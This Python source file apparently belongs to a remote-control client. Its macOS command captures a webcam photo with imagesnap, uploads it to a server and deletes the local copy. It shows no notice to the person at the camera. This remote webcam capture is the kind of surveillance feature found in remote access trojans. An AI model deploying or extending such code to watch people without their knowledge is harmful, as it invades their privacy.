import os
import subprocess

from client.commands.shell.decorators import shell_command
from client.runtime.temp_workspace import make_client_temp_file, cleanup_temp_path
from core.utils.artifact_naming import build_artifact_filename
from core.utils.formatting import get_size


class MacShellCommands:
    """macOS Shell commands."""

    @shell_command('Capture webcam photo', group='media', output='stream')
    def webcam_snap(self):
        """拍照并上传到服务器"""
        temp_file = None

        try:
            result = subprocess.run(['which', 'imagesnap'], capture_output=True)
            if result.returncode != 0:
                return 0, '请安装 imagesnap: brew install imagesnap'

            temp_fd, temp_path = make_client_temp_file(
                'media_temp',
                prefix='webcam_',
                suffix='.jpg',
            )
            os.close(temp_fd)
            temp_file = temp_path
            self.emit_progress(f'Client Temp Path: {temp_file}', level='info')

            capture = subprocess.run(
                ['imagesnap', '-w', '1', temp_file],
                capture_output=True,
                timeout=5,
            )
            if capture.returncode != 0:
                return 0, 'Failed to capture webcam photo'

            if os.path.getsize(temp_file) > 0:
                status, message = self.http_file_transfer_service.upload_single_file_to_server_result(
                    temp_file,
                    category='webcam',
                    upload_name=build_artifact_filename('webcam', 'jpg'),
                    extra={'saved_from': 'client_command', 'source_command': 'webcam_snap'},
                )
                if not status:
                    return 0, f'Webcam upload failed: {message}'
                file_size = get_size(os.path.getsize(temp_file))
                return 1, f'Webcam photo captured ({file_size})'

            return 0, 'Failed to capture webcam photo'
        except Exception as e:
            return 0, f'Webcam capture failed: {e}'
        finally:
            if temp_file:
                cleanup_temp_path(temp_file)
